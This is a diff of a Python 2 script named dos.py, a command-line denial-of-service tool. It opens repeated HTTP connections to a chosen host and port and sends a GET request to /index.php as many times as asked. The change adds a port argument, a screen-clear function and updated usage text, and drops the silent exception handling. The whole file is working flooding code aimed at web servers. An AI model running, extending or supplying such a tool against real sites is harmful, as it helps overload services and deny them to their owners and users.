@@ -2,6 +2,8 @@ import argparse
 import httplib
 import time
 import sys
+
+import os
 from progress.bar import Bar
 
 
@@ -26,36 +28,44 @@ def banner():
  ''')
 
 
-def setconnect(t, n):
-    try:
-        bar = Bar('Sending request',max = int(n))
-        for i in range(1, int(n)):
-            httpconnection = httplib.HTTPConnection(t, 80)
-            httpconnection.request("GET", "/index.php")
-            bar.next()
-        else:
-            print('\r\n -------- send {0} request to target {1} -------- '.format(n, t))
-            bar.finish()
-    except:
-        pass
+def setconnect(t, p, n):
+    bar = Bar('Sending request', max=int(n))
+    for i in range(1, int(n)):
+        httpconnection = httplib.HTTPConnection(t, p)
+        httpconnection.request("GET", "/index.php")
+        bar.next()
+    else:
+        print('\r\n -------- send {0} request to target {1} with port {2}-------- '.format(n, t, p))
+        bar.finish()
+
+
+def clear():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
 
 
 if __name__ == "__main__":
+    clear()
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target")
     parser.add_argument("-n", "--count")
+    parser.add_argument("-p", "--port")
     args = parser.parse_args()
     if not args.target or not args.count:
         print (' ')
         print('  Usage: ./dos.py [options]')
         print(' ')
         print('  Options: -t, --target    <hostname>   |   Target')
-        print('           -n, --count     <connection times>|   Counts')
+        print('           -n, --count     <connection times> |   Counts')
+        print ('           -p, --port     <port> |   Pounts')
         print(' ')
+
         print('  Example: ./dos.py -t www.test.com -n 100 ')
         sys.exit(0)
     banner()
     target = args.target
     count = args.count
-    setconnect(target, count)
-
+    port = args.port
+    setconnect(target, port, count)
